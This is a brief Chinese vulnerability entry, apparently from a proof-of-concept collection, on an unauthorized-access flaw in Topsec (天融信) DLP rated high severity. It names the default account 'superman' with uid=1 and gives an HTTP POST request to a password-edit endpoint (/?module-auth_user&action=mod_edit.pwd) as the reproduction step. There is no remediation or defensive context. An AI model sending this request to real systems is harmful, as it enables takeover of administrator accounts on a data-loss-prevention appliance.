# 天融信 DLP 未授权访问漏洞

## 漏洞描述
天融信DLP存在未授权访问漏洞

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
POC为

```plain
默认用户superman的uid=1
POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1
```
